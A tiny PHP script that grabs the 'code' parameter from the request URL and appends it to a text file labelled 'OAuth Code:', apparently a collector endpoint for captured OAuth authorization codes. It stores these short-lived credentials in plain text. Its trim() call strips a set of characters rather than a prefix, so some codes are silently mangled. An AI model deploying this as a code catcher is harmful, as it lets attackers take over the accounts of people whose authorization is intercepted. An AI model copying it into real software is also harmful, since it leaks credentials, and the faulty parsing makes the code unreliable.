<?php
$requestUrl = $_SERVER['REQUEST_URI'];
$file = 'codes.txt';
$fp = fopen($file, 'a');
$trim = trim($requestUrl, "/?code=");
$oauthCode = strtok($trim, "&");
fwrite($fp, "OAuth Code:\n");
fwrite($fp, $oauthCode . "\n\n\n");
fclose($fp);
?>